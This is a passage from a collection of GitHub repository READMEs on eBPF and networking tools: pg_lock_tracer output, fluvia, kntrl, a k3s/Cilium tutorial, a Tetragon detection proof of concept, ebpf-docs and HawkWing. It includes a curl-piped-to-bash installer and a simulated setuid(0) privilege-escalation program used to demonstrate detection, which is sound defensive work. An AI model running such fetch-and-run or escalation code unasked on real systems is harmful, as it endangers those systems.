animate_lock_graph -i lock -o locks.html
```

## Example Output

CLI: `pg_lock_tracer -x /home/jan/postgresql-sandbox/bin/REL_14_2_DEBUG/bin/postgres -p 327578 -r 327578:sql://jan@localhost/test2 --statistics`

SQL Query: `create table metrics(ts timestamptz NOT NULL, id int NOT NULL, value float);`

Tracer Output:

```
745064333930117 [Pid 327578] Query begin 'create table metrics(ts timestamptz NOT NULL, id int NOT NULL, value float);'
745064333965769 [Pid 327578] Transaction begin
745064334157640 [Pid 327578] Table open 3079 (pg_catalog.pg_extension) AccessShareLock
745064334176147 [Pid 327578] Lock object 3079 (pg_catalog.pg_extension) AccessShareLock
745064334204453 [Pid 327578] Lock granted (fastpath) 3079 (pg_catalog.pg_extension) AccessShareLock
745064334224361 [Pid 327578] Lock granted (local) 3079 (pg_catalog.pg_extension) AccessShareLock (Already hold local 0)
745064334243659 [Pid 327578] Lock was acquired in 67512 ns
[...]
```

<details>
  <summary>Full Output</summary>

```
===> Ready to trace queries
745064333930117 [Pid 327578] Query begin 'create table metrics(ts timestamptz NOT NULL, id int NOT NULL, value float);'
745064333965769 [Pid 327578] Transaction begin
745064334157640 [Pid 327578] Table open 3079 (pg_catalog.pg_extension) AccessShareLock
745064334176147 [Pid 327578] Lock object 3079 (pg_catalog.pg_extension) AccessShareLock
745064334204453 [Pid 327578] Lock granted (fastpath) 3079 (pg_catalog.pg_extension) AccessShareLock
745064334224361 [Pid 327578] Lock granted (local) 3079 (pg_catalog.pg_extension) AccessShareLock (Already hold local 0)
745064334243659 [Pid 327578] Lock was acquired in 67512 ns
745064334285877 [Pid 327578] Lock object 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334309610 [Pid 327578] Lock granted (fastpath) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334328475 [Pid 327578] Lock granted (local) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock (Already hold local 0)
745064334345266 [Pid 327578] Lock was acquired in 59389 ns
745064334562977 [Pid 327578] Lock ungranted (fastpath) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334583578 [Pid 327578] Lock ungranted (local) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock (Hold local 0)
745064334608957 [Pid 327578] Table close 3079 (pg_catalog.pg_extension) AccessShareLock
745064334631046 [Pid 327578] Lock ungranted (fastpath) 3079 (pg_catalog.pg_extension) AccessShareLock
745064334649932 [Pid 327578] Lock ungranted (local) 3079 (pg_catalog.pg_extension) AccessShareLock (Hold local 0)
745064334671897 [Pid 327578] Table open 3079 (pg_catalog.pg_extension) AccessShareLock
745064334688382 [Pid 327578] Lock object 3079 (pg_catalog.pg_extension) AccessShareLock
745064334712042 [Pid 327578] Lock granted (fastpath) 3079 (pg_catalog.pg_extension) AccessShareLock
745064334731081 [Pid 327578] Lock granted (local) 3079 (pg_catalog.pg_extension) AccessShareLock (Already hold local 0)
745064334748288 [Pid 327578] Lock was acquired in 59906 ns
745064334772367 [Pid 327578] Lock object 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334795943 [Pid 327578] Lock granted (fastpath) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334814983 [Pid 327578] Lock granted (local) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock (Already hold local 0)
745064334832570 [Pid 327578] Lock was acquired in 60203 ns
745064334953192 [Pid 327578] Lock ungranted (fastpath) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock
745064334973518 [Pid 327578] Lock ungranted (local) 3081 (pg_catalog.pg_extension_name_index) AccessShareLock (Hold local 0)
745064334997936 [Pid 327578] Table close 3079 (pg_catalog.pg_extension) AccessShareLock
745064335019473 [Pid 327578] Lock ungranted (fastpath) 3079 (pg_catalog.pg_extension) AccessShareLock
745064335037880 [Pid 327578] Lock ungranted (local) 3079 (pg_catalog.pg_extension) AccessShareLock (Hold local 0)
745064335901618 [Pid 327578] Table open 1259 (pg_catalog.pg_class) AccessShareLock
745064335918354 [Pid 327578] Lock object 1259 (pg_catalog.pg_class) AccessShareLock
745064335941911 [Pid 327578] Lock granted (fastpath) 1259 (pg_catalog.pg_class) AccessShareLock
745064335960211 [Pid 327578] Lock granted (local) 1259 (pg_catalog.pg_class) AccessShareLock (Already hold local 0)
745064335976642 [Pid 327578] Lock was acquired in 58288 ns
745064335999654 [Pid 327578] Lock object 2663 (pg_catalog.pg_class_relname_nsp_index) AccessShareLock
745064336022776 [Pid 327578] Lock granted (fastpath) 2663 (pg_catalog.pg_class_relname_nsp_index) AccessShareLock
745064336040926 [Pid 327578] Lock granted (local) 2663 (pg_catalog.pg_class_relname_nsp_index) AccessShareLock (Already hold local 0)
745064336057158 [Pid 327578] Lock was acquired in 57504 ns
745064336187786 [Pid 327578] Lock ungranted (fastpath) 2663 (pg_catalog.pg_class_relname_nsp_index) AccessShareLock
745064336207011 [Pid 327578] Lock ungranted (local) 2663 (pg_catalog.pg_class_relname_nsp_index) AccessShareLock (Hold local 0)
745064336230761 [Pid 327578] Table close 1259 (pg_catalog.pg_class) AccessShareLock
745064336252413 [Pid 327578] Lock ungranted (fastpath) 1259 (pg_catalog.pg_class) AccessShareLock
745064336270811 [Pid 327578] Lock ungranted (local) 1259 (pg_catalog.pg_class) AccessShareLock (Hold local 0)
745064336314237 [Pid 327578] Lock granted 2615 (pg_catalog.pg_namespace) AccessShareLock (Requested locks 1)
745064336331450 [Pid 327578] Lock granted (local) 2615 (pg_catalog.pg_namespace) AccessShareLock (Already hold local 0)
745064336402316 [Pid 327578] Lock granted (local) 2615 (pg_catalog.pg_namespace) AccessShareLock (Already hold local 1)
745064336543618 [Pid 327578] Table open 1259 (pg_catalog.pg_class) RowExclusiveLock
745064336560502 [Pid 327578] Lock object 1259 (pg_catalog.pg_class) RowExclusiveLock
745064336584633 [Pid 327578] Lock granted (fastpath) 1259 (pg_catalog.pg_class) RowExclusiveLock
745064336602915 [Pid 327578] Lock granted (local) 1259 (pg_catalog.pg_class) RowExclusiveLock (Already hold local 0)
745064336619969 [Pid 327578] Lock was acquired in 59467 ns
745064336655328 [Pid 327578] Table open 1247 (pg_catalog.pg_type) AccessShareLock
745064336671769 [Pid 327578] Lock object 1247 (pg_catalog.pg_type) AccessShareLock
745064336696072 [Pid 327578] Lock granted (fastpath) 1247 (pg_catalog.pg_type) AccessShareLock
745064336714540 [Pid 327578] Lock granted (local) 1247 (pg_catalog.pg_type) AccessShareLock (Already hold local 0)
745064336731130 [Pid 327578] Lock was acquired in 59361 ns
745064336755221 [Pid 327578] Lock object 2704 (pg_catalog.pg_type_typname_nsp_index) AccessShareLock
745064336778586 [Pid 327578] Lock granted (fastpath) 2704 (pg_catalog.pg_type_typname_nsp_index) AccessShareLock
745064336797018 [Pid 327578] Lock granted (local) 2704 (pg_catalog.pg_type_typname_nsp_index) AccessShareLock (Already hold local 0)
745064336813397 [Pid 327578] Lock was acquired in 58176 ns
745064336932804 [Pid 327578] Lock ungranted (fastpath) 2704 (pg_catalog.pg_type_typname_nsp_index) AccessShareLock
745064336952174 [Pid 327578] Lock ungranted (local) 2704 (pg_catalog.pg_type_typname_nsp_index) AccessShareLock (Hold local 0)
745064336975237 [Pid 327578] Table close 1247 (pg_catalog.pg_type) AccessShareLock
745064336996581 [Pid 327578] Lock ungranted (fastpath) 1247 (pg_catalog.pg_type) AccessShareLock
745064337014858 [Pid 327578] Lock ungranted (local) 1247 (pg_catalog.pg_type) AccessShareLock (Hold local 0)
745064337047504 [Pid 327578] Lock object 2662 (pg_catalog.pg_class_oid_index) AccessShareLock
745064337070928 [Pid 327578] Lock granted (fastpath) 2662 (pg_catalog.pg_class_oid_index) AccessShareLock
745064337089515 [Pid 327578] Lock granted (local) 2662 (pg_catalog.pg_class_oid_index) AccessShareLock (Already hold local 0)
745064337106032 [Pid 327578] Lock was acquired in 58528 ns
745064337183488 [Pid 327578] Lock ungranted (fastpath) 2662 (pg_catalog.pg_class_oid_index) AccessShareLock
745064337202563 [Pid 327578] Lock ungranted (local) 2662 (pg_catalog.pg_class_oid_index) AccessShareLock (Hold local 0)
745064337621853 [Pid 327578] Table open 1247 (pg_catalog.pg_type) AccessShareLock
745064337638996 [Pid 327578] Lock object 1247 (pg_catalog.pg_type) AccessShareLock
745064337661950 [Pid 327578] Lock granted (fastpath) 1247 (pg_catalog.pg_type) AccessShareLock
745064337681169 [Pid 327578] Lock granted (local) 1247 (pg_catalog.pg_type) AccessShareLock (Already hold local 0)
745064337697945 [Pid 327578] Lock was acquired in 58949 ns
745064337723254 [Pid 327578] Lock object 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064337746949 [Pid 327578] Lock granted (fastpath) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064337765491 [Pid 327578] Lock granted (local) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock (Already hold local 0)
745064337781897 [Pid 327578] Lock was acquired in 58643 ns
745064337865717 [Pid 327578] Lock ungranted (fastpath) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064337885245 [Pid 327578] Lock ungranted (local) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock (Hold local 0)
745064337907299 [Pid 327578] Table close 1247 (pg_catalog.pg_type) AccessShareLock
745064337928390 [Pid 327578] Lock ungranted (fastpath) 1247 (pg_catalog.pg_type) AccessShareLock
745064337946792 [Pid 327578] Lock ungranted (local) 1247 (pg_catalog.pg_type) AccessShareLock (Hold local 0)
745064337970694 [Pid 327578] Table open 1247 (pg_catalog.pg_type) RowExclusiveLock
745064337987065 [Pid 327578] Lock object 1247 (pg_catalog.pg_type) RowExclusiveLock
745064338010254 [Pid 327578] Lock granted (fastpath) 1247 (pg_catalog.pg_type) RowExclusiveLock
745064338028898 [Pid 327578] Lock granted (local) 1247 (pg_catalog.pg_type) RowExclusiveLock (Already hold local 0)
745064338045413 [Pid 327578] Lock was acquired in 58348 ns
745064338073508 [Pid 327578] Lock object 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064338096688 [Pid 327578] Lock granted (fastpath) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064338114955 [Pid 327578] Lock granted (local) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock (Already hold local 0)
745064338131934 [Pid 327578] Lock was acquired in 58426 ns
745064338198858 [Pid 327578] Lock ungranted (fastpath) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock
745064338218267 [Pid 327578] Lock ungranted (local) 2703 (pg_catalog.pg_type_oid_index) AccessShareLock (Hold local 0)
745064338257754 [Pid 327578] Lock object 2703 (pg_catalog.pg_type_oid_index) RowExclusiveLock
745064338281754 [Pid 327578] Lock granted (fastpath) 2703 (pg_catalog.pg_type_oid_index) RowExclusiveLock
745064338300356 [Pid 327578] Lock granted (local) 2703 (pg_catalog.pg_type_oid_index) RowExclusiveLock (Already hold local 0)
7"
nttcom/fluvia,34,4,34,6,Go,IPFIX Exporter using eBPF/XDP and IPFIX Library in Go,2023-06-06T04:14:48Z,2025-09-28T19:43:11Z,145,"<p align=""center"">
<img src=""https://github.com/nttcom/fluvia/blob/main/docs/figures/fluvia.png"" alt=""Fluvia Exporter"" width=""15%"">
</p>

# Fluvia Exporter

[![Linter](https://github.com/nttcom/fluvia/actions/workflows/ci.yml/badge.svg)](https://github.com/nttcom/fluvia/actions)
[![Releaser](https://github.com/nttcom/fluvia/actions/workflows/release.yml/badge.svg)](https://github.com/nttcom/fluvia/actions)
[![Go Report Card](https://goreportcard.com/badge/nttcom/fluvia)](https://goreportcard.com/report/github.com/nttcom/fluvia) 
[![Go Reference](https://pkg.go.dev/badge/github.com/nttcom/fluvia.svg)](https://pkg.go.dev/github.com/nttcom/fluvia)
[![Go version](https://img.shields.io/github/go-mod/go-version/nttcom/fluvia)](https://go.dev/)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

IPFIX Exporter using eBPF/XDP and IPFIX Library in Go

## Features
* IPFIX Exporter with eBPF/XDP
* IPFIX Library in Go
    * Support for [IANA Reserved Information Elements (IEs)](https://www.iana.org/assignments/ipfix/ipfix.xhtml)

## Installation & Use
* [Getting Started](docs/sources/getting-started.md)

## Contributing
If you are interested in contributing to the project, please refer to the [CONTRIBUTING](https://github.com/nttcom/fluvia/blob/main/CONTRIBUTING.md) guidelines.  
Feel free to fork the repository and create a Pull Request. Your contributions are highly appreciated.

## Licensing
Fluvia Exporter is licensed under the [MIT license](https://en.wikipedia.org/wiki/MIT_License).  
For the full license text, see [LICENSE](https://github.com/nttcom/fluvia/blob/master/LICENSE).

## Miscellaneous
Fluvia Exporter supports the following IEs:
  - packetDeltaCount
  - [draft-ietf-opsawg-ipfix-srv6-srh](https://datatracker.ietf.org/doc/draft-ietf-opsawg-ipfix-srv6-srh/)
    - srhActiveSegmentIPv6
    - srhSegmentsIPv6Left
    - srhFlagsIPv6
    - srhTagIPv6
    - srhSegmentIPv6BasicList
  - [draft-ietf-opsawg-ipfix-on-path-telemetry](https://datatracker.ietf.org/doc/draft-ietf-opsawg-ipfix-on-path-telemetry/)
    - PathDelayMeanDeltaMicroseconds
    - PathDelayMaxDeltaMicroseconds
    - PathDelayMinDeltaMicroseconds
    - PathDelaySumDeltaMicroseconds 
"
kondukto-io/kntrl,121,6,121,3,C,"kntrl is an eBPF based runtime agent that monitors and prevents anomalous behaviour defined by you on your pipeline. kntrl achieves this by monitoring kernel calls, and denying access as soon as your defined behaviour is detected. For more: https://kntrl.dev",2024-01-17T21:41:06Z,2025-10-12T18:46:23Z,144,"![kntrl logo](./docs/img/kntrl_logo.png) <!-- markdownlint-disable-line first-line-heading -->

`kntrl` is an eBPF based runtime agent that monitors and prevents anomalous behaviour defined by you on your pipeline. kntrl achieves this by monitoring kernel calls, and denying access as soon as your defined behaviour is detected. Refer to this [presentation](https://docs.google.com/presentation/d/1nmbqGfIxp9UyxlfT5EJyQsEWtQaXVoWD9Qjj1MJevuk/edit?usp=sharing) to dive deeper into how we are achieving what kntrl does.

It can work as a single binary (`kntrl`) or with a docker runner (`docker.io/kondukto/kntrl:0.1.2`).

## Installation

### Linux

`kntrl` is available as downloadable binaries from the releases page. Download the pre-compiled binary from the `releases` page and copy to the desired location.

### Container Images

We provide ready to use Docker container images. To pull the latest image:

```
docker pull kondukto/kntrl:latest
```

To pull a specific version:

```
docker pull kondukto/kntrl:0.1.4
```

## Using kntrl

You can start using kntrl agent by simply running the following command, if you pass `--daemonize` flag the process will run in the background:

```yaml
- name: start kntrl agent
  run: sudo ./kntrl start --mode=monitor --allowed-hosts=download.kondukto.io,${{ env.GITHUB_ACTIONS_URL }} --allowed-ips=10.0.2.3  --daemonize
```

to stop `kntrl` and print reports:

```yaml
- name: stop kntrl agent
  run: sudo ./kntrl stop
```

OR with the docker:

```yaml
- name: kntrl agent
  run: sudo docker start --privileged \
    --pid=host \
    --network=host \
    --cgroupns=host \
    --volume=/sys/kernel/debug:/sys/kernel/debug:ro \
    --volume /tmp:/tmp \
    --rm docker.io/kondukto/kntrl:0.1.2 run --mode=trace --allowed-hosts=kondukto.io,download.kondukto.io
```

This action will deploy kntrl into any GitHub Actions build.

## Usage

The `kntrl` agent is self explanatory and it comes with a help command. Simply run `--help` flag after each command/subcommand.

```
 ./kntrl --help
Usage:
  kntrl [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  start       Start kntrl
  status      Print kntrl daemon status
  stop        Stop kntrl daemon

Flags:
  -h, --help      help for kntrl
  -v, --verbose   more logs
      --version   version for kntrl

Use ""kntrl [command] --help"" for more information about a command.
Runtime security tool to control and monitor egress/ingress traffic in CI/CD runners
```

The agent supports the following parameters:

```
| Name                 | Default          | Description                                                         |
| -------------------- | ---------------- | ------------------------------------------------------------------- | --- |
| `mode`               | monitor          | kntrl for detected behaviours (monitor or prevent/trace)            |
| `allowed-hosts`      |                  | allowed host list. (example.com, .github.com)                       |
| `allowed-ips`        |                  | allowed IP list. (192.168.0.100, 1.1.1.1)                           |
| `allow-local-ranges` | true             | allow access to local IP ranges                                     |
| `allow-github-meta`  | false            | allow access to GitHub meta IP ranges (https://api.github.com/meta) |
| `output-file`        | `/tmp/kntrl.out` | report file                                                         |     |
```

### Running kntrl on monitoring mode

```yaml
- name: kntrl agent
  run: sudo docker start --privileged \
  --pid=host \
  --network=host \
  --cgroupns=host \
  --volume=/sys/kernel/debug:/sys/kernel/debug:ro \
  --volume /tmp:/tmp \
  --rm docker.io/kondukto/kntrl:0.1.2 \
  --mode=monitor
```

### Running kntrl on prevent mode

```yaml
- name: kntrl agent
  run: sudo docker start --privileged \
  --pid=host \
  --network=host \
  --cgroupns=host \
  --volume=/sys/kernel/debug:/sys/kernel/debug:ro \
  --volume /tmp:/tmp \
  --rm docker.io/kondukto/kntrl:0.1.2 \
  --mode=trace --allowed-hosts=download.kondukto.io, .github.com
```

## Open Policy Agent (OPA) Rules

`kntrl` supports an OPA-based policy engine to determine whether the event should be blocked or not. All the policy rules are stored under the bundle/kntrl/ directory.

An example rego rule:

```
package kntrl.network[""is_local_ip_addr""]

import rego.v1

policy if {
        ipaddr := input.daddr
        local_ranges := [""192.168.0.0/16"", ""172.16.0.0/12"", ""10.0.0.0/8"", ""0.0.0.0/32""]
        net.cidr_contains(local_ranges[_], ipaddr)
        data.allow_local_ip_ranges == true
}
```

## Reporting

Each event will be logged in the output file. The default report file location is `/tmp/kntrl.out`.

Here is an example report:

```
{
  ""pid"": 2806,
  ""task_name"": ""curl"",
  ""proto"": ""tcp"",
  ""daddr"": ""140.82.114.22"",
  ""dport"": 443,
  ""domains"": [
    ""lb-140-82-114-22-iad.github.com.""
  ],
  ""policy"": ""pass""
}
{
  ""pid"": 2806,
  ""task_name"": ""curl"",
  ""proto"": ""tcp"",
  ""daddr"": ""142.251.167.95"",
  ""dport"": 443,
  ""domains"": [
    ""ww-in-f95.1e100.net.""
  ],
  ""policy"": ""block""
}
{
  ""pid"": 2806,
  ""task_name"": ""curl"",
  ""proto"": ""udp"",
  ""daddr"": ""127.0.0.1"",
  ""dport"": 53,
  ""domains"": [
    ""localhost""
  ],
  ""policy"": ""pass""
}
```

or

```
Pid  | Comm    | Proto | Domain                          | Destination Addr   | Policy
------------------------------------------------------------------------------------
2806 | curl    | tcp   | lb-140-82-114-22-iad.github.com | 140.82.114.22:443  | pass
------------------------------------------------------------------------------------
2806 | curl    | tcp   | ww-in-f95.1e100.net             | 142.251.167.95:443 | block
------------------------------------------------------------------------------------
2806 | curl    | udp   | localhost                       | 127.0.0.1:53       | pass
------------------------------------------------------------------------------------
```

## Contribution

Contributions to kntrl are welcome.
Feel free to join our slack channel [https://kntrl.slack.com](https://kntrl.slack.com)

## License

Except for the eBPF code, all components are distributed under the [Apache License (version 2.0)](./LICENSE.md).

## More about Kondukto

`kntrl` is an open source project maintained by [Kondukto](https://kondukto.io).
"
pradhans0906/K8S-CNI-Cilium-Tutorial,10,4,10,1,Shell,,2024-01-20T14:33:49Z,2025-08-19T17:14:35Z,15,"
![](./logo.jpeg)


# k3s Cluster Setup with Cilium

This script automates the process of setting up a lightweight Kubernetes (k3s) cluster with Cilium as the CNI (Container Network Interface). It is designed to run on macOS systems using Multipass for virtualization.

## Requirements

- macOS system
- [Homebrew](https://brew.sh/)
- [Multipass](https://multipass.run/)

## Installation

Before running the script, ensure Homebrew and Multipass are installed on your system.

1. Install Homebrew (if not already installed):
   ```sh
   /bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""

2. Install Multipass using Homebrew:

```sh
brew install --cask multipass

3. Download the script k3s-cilium.sh from the repository.

```sh
4. Make the script executable:

    chmod +x k3s-cilium.sh

5. Run the script:

   ./setup-k3s-cilium.sh

The script will perform the following actions:

Create a k3s leader and follower nodes using Multipass.
Install and configure k3s on these nodes.
Set up Cilium as the CNI plugin.
Configure kubectl to interact with the cluster.
```sh
6. Post-installation
After the script completes, you can use kubectl from your local machine to interact with your k3s cluster. The Cilium CLI is also available for managing network policies and other Cilium-specific configurations.


Troubleshooting
If you encounter any issues during the installation, check the following:

Ensure Multipass VMs are running correctly.
Verify if k3s and Cilium services are up and running.
Check the logs for any error messages.
Contributing
Contributions to the script are welcome! Please feel free to submit pull requests or open issues for any enhancements or fixes.

License
MIT License

Acknowledgments
This script was created to simplify the setup of a k3s cluster with Cilium on macOS environments. Thanks to the developers of k3s, Cilium, and Multipass for their fantastic tools.
"
h3x-eilidh/poc-tetragon-tracingpolicy,2,0,2,0,,,2024-01-18T17:15:35Z,2024-01-30T19:32:06Z,1,"## Tetragon for Security observability using Tracing Policies

<img src=""https://tetragon.io/svgs/tetragon-shield.svg"" alt=""Tetragon"" width=""200""/>

<!-- ![Tetragon](https://tetragon.io/svgs/tetragon-shield.svg) -->



In this proof-of-concept, our focus is on showcasing how Tetragon can help us in detecting anomalies (a privilege escalation attempt, in this case) within a Kubernetes cluster using a tracing policy.  
The simulation involves a controlled scenario where a process attempts to manipulate setuid bits, illustrating the significance of early detection in preventing potential security breaches.

### Create the cluster with Kind

Use Kind to create a multi-node Kubernetes cluster with one control plane node and three worker nodes.

```
cat <<EOF > kind-multinode.conf && kind create cluster --name k8s --config kind-multinode.conf
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
- role: worker
- role: worker
# networking:
#  disableDefaultCNI: true
EOF
```

### Add Cilium/Tetragon Helm Repo and Install Helm Chart

Add the Cilium Helm repository, update the repository index, and install the *Tetragon* Helm chart in the `kube-system` namespace.

```
helm repo add cilium https://helm.cilium.io && helm repo update && helm install tetragon cilium/tetragon -n kube-system
```

### Apply Tetragon Policy

Apply a Tetragon policy that monitors and logs attempts to use the setuid system call to set setuid bits to 0.

``` 
kubectl apply -f https://raw.githubusercontent.com/cilium/tetragon/main/examples/policylibrary/privileges/privileges-setuid-root.yaml
```

The policy syntax is straightforward, it defines a Kprobe configuration for tracing the `__sys_setuid` system call and send an alert when the conditions are met.

```
spec:
  kprobes:
  - call: ""__sys_setuid""
    syscall: false
    return: true
    args:
    - index: 0
      type: ""int""
    returnArg:
      index: 0
      type: ""int""
    selectors:
    - matchArgs:
      - index: 0
        operator: ""Equal""
        values:
        - ""0""
      matchActions:
      - action: Post
        rateLimit: ""1m""  # Rate limit messages to 1min
```

### Create Pod with Anomalous Behavior

Define a Kubernetes pod manifest with an init container that compiles a C program (`setuid-root.c`) attempting to set its setuid bits to 0. The main container runs this C program in a loop, simulating a process trying to escalate privileges.

```
apiVersion: v1
kind: Pod
metadata:
  name: setuid-root-pod
spec:
  initContainers:
  - name: init-gcc
    image: ubuntu:latest
    command: [""/bin/bash"", ""-c""]
    volumeMounts:
    - name: source
      mountPath: /src
    args:
      - |
        apt-get update && apt-get install -y gcc
        cat <<EOF > /src/setuid-root.c
        #define _GNU_SOURCE
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>
        #include <sys/wait.h>
        int main() {
            if (setuid(0) == 0) {
                printf(""Privilege escalation successful. This process now has root privileges (UID: %d)\n"", getuid());
                } else {
                perror(""Privilege escalation failed"");
                }
            return 0;
        }
        EOF
        gcc /src/setuid-root.c -o /src/setuid-root
  containers:
  - name: run-container
    image: ubuntu:latest
    command: [""/bin/bash""]
    args: [""-c"", ""while true; do /src/setuid-root; sleep 5; done""]
    securityContext:
      runAsUser: 1000
      runAsGroup: 1000
    volumeMounts:
    - name: source
      mountPath: /src
  volumes:
  - name: source
    emptyDir: {}
```

We can inspect the logs of the running pod to observe the behavior of the C program, which repeatedly attempts to set its setuid bits to 0.

```
k logs setuid-root-pod -c run-container
```

Now we can use Tetragon to detect and log events related to the anomalous setuid behavior. The Tetragon DaemonSet (`ds/tetragon`) is deployed in the `kube-system` namespace, and we use the `tetra getevents -o compact` command to retrieve and display these events in a human-readable way.

```
kubectl exec -it -n kube-system ds/tetragon -c tetragon -- tetra getevents -o compact
```

The events indicate that there is a process attempting to use the system call `__sys_setuid` to set its setuid bits to 0, providing insight into potential security threats and privilege escalation attempts in the Kubernetes cluster.

![Tetragon Logs](https://i.ibb.co/3B2kq88/g4w-Bd-Kupp-Screenshot-2024-01-18-at-15-41-15.png)

Executing `tetra getevents` provides a comprehensive JSON representation of the entire event stack. 

```
{""process_exec"":{""process"":{""exec_id"":""*="",""pid"":293470,""uid"":1000,""cwd"":""/"",""binary"":""/usr/bin/sleep"",""arguments"":""5"",""flags"":""execve rootcwd clone"",""start_time"":""2024-01-18T15:37:19.566563222Z"",""auid"":4294967295,""pod"":{""namespace"":""default"",""name"":""setuid-root-pod"",""container"":{""id"":""containerd://*"",""name"":""run-container"",""image"":{""id"":""docker.io/library/ubuntu@sha256:*"",""name"":""docker.io/library/ubuntu:latest""},""start_time"":""*"",""pid"":1483},""workload"":""setuid-root-pod"",""workload_kind"":""Pod""},""docker"":""*"",""parent_exec_id"":""*="",""tid"":293470},""parent"":{""exec_id"":""*="",""pid"":247248,""uid"":1000,""cwd"":""/"",""binary"":""/bin/bash"",""arguments"":""-c \""while true; do /src/setuid-root; 
```

This resource includes further details, including the workload responsible for generating anomalies.  

```[...]""pod"":{""namespace"":""default"",""name"":""setuid-root-pod"",""container"":{""id"":""containerd://*"",""name"":""run-container"",""image"":[...]```

Now we are well-equipped to effectively take proactive measures against any potential security threats.

https://tetragon.io/docs/concepts/tracing-policy/selectors/#actions-filter

"
isovalent/ebpf-docs,443,86,443,14,Go,An effort to comprehensively document eBPF,2023-01-25T12:53:40Z,2025-10-11T12:09:31Z,408,"# eBPF Docs

This project aims to provide documentation for eBPF, with a specific focus on technical details for developers of projects that use eBPF.

## Getting started - Serving docs

In order to see the docs in browser you need to serve them locally. This can be done with docker via the makefile.
```
$ make serve
```

Or you can serve from you own host by following these steps:
```
$ python3 -m venv .venv
$ source .venv/bin/activate
$ pip install -r requirements.txt
$ mkdocs serve -a 127.0.0.1:8000 --watch ./docs
```

## Docs about docs

Go to https://docs.ebpf.io/meta/ for some documentation about this project itself.

## Contributing

This project is meant to provide a common knowledge base of the whole eBPF community, everyone is free to submit changes via Github Pull Requests, please read our [Contributions Guide](./contributions-guide.md) for details and guidelines.
"
hawkv6/hawkwing,7,2,7,6,Go,Leveraging eBPF for Intent-Driven Application-Centric End-to-End Segment Routing over IPv6,2023-08-24T09:25:34Z,2025-09-07T12:13:33Z,209,"# HawkWing
> Leveraging eBPF for Intent-Driven Application-Centric End-to-End Segment Routing over IPv6

This work was conducted as Master Thesis at the Eastern Switzerland University of Applied Sciences.  
The thesis is available [here](docs/Master_Thesis.pdf), and the presentation is available [here](docs/Master_Thesis_Presentation.pdf).

## Overview
HawkWing is a prototype implementation of Intent-Driven Application-Centric End-to-End Segment Routing over IPv6. It leverages eBPF to implement the data plane of the prototype. The control plane is implemented in Golang. 
HawkWing is a versatile tool that operates in both client and server modes, offering a dynamic and adaptive approach to network packet handling and routing. 

## Features
- **Intent-driven routing**: HawkWing can route packets based on the intent of the user. This is achieved by either using the manually configured SID list in the configurationf file or by contacting the HawkEye server to retrieve the SID list for the given destination address and intents. 
- **Application-centric routing**: HawkWing can route packets based on the destination application. This is achieved by storing a unique mapping of destination IPv6 address and application port. Outgoing packets are then matched against this mapping and routed according to the corresponding SID list. On the server side this mapping is automatically generated by HawkWing, by inspecting the incoming packets and extracting the source IPv6 address and application port together with the SID list. This unique tripple is then stored, with the SID list reversed, as outgoing mapping on the server.
- **End-to-end Segment Routing**: HawkWing routes packets based on the IPv6 Segment Routing Header (SRH). The encapsulation and decapsulation is done directly on the server and client, respectively. This end-to-end approach allows for a more flexible and dynamic routing of packets. More specifically, Segment Routing policies on edge router can be avoided, as the routing is done directly on the client and server.

## Architecture
HawkWing is composed of two main components, namely the client and server. The client is responsible for the configuration, controller communication, and packet encapsulation/decapsulation. The server is responsible for the encapsulation/decapsulation and reversing of the SID list. More information can be found in the [thesis](docs/Master_Thesis.pdf), and the [presentation](docs/Master_Thesis_Presentation.pdf).
![Application Architecture](docs/architecture.png).

## Development Network
HawkWing's development environment is crafted using VPP (Vector Packet Processing) and Linux namespaces. This setup was chosen for its robustness and flexibility, allowing for seamless development and testing directly on the server within isolated namespaces. The development environment is depicted in the figure below.
![Development Network](docs/network.png)

## Configuration Structure

The Hawkwing configuration is structured as follows:

| Section | Subsection | Key | Description |
| ------- | ---------- | --- | ----------- |
| `client_ipv6_address` | | | The IPv6 address of the client. When not defined it takes the first address of the given interface. |
| `hawkeye` | | `enabled` | Enable/disable HawkEye controller. |
| | | `address` | The IPv6 address of the HawkEye controller. |
| | | `port` | The port number on which the HawkEye controller listens. |
| `services` | | `service1`, `service2`, `service3`, ... | Service-specific configurations. Each service has its own set of configurations. |
| | `domain_name` | | The domain name of the service. |
| | `ipv6_addresses`| | List of IPv6 addresses assigned to the service (optional).                                                 |
| | `applications` | | List of applications within the service. Each application has its own set of configurations. |
| | | `port` | The port number for the application. |
| | | `sid` | List of Segment IDs (SIDs) for SRv6 routing (when defining an intent, optional). |
| | | `intents` | List of intents for segment routing. Each intent has its own set of configurations. |
| | | `intent` | The type of intent (e.g., `sfc`, `flex-algo`, `high-bandwidth`, `low-bandwidth`, `low-latency`). |
| | | `functions` | List of functions for the `sfc` intent. |
| | | `flex_algo_number`| The algorithm number for the `flex-algo` intent. |
| | | `min_value` | The minimum value for `high-bandwidth`, `low-bandwidth`, and `low-latency` intents. |
| | | `max_value` | The maximum value for `high-bandwidth`, `low-bandwidth`, and `low-latency` intents. |

### Intent Specification
The intent specification is a list of intents for segment routing. Each intent has its own set of configurations. The intent specification is structured as follows:

| Intent | Description |
| ------ | ----------- |
| `sfc` | Service Function Chaining (SFC) intent. When defining an SFC intent it has to be always the first one in the list. |
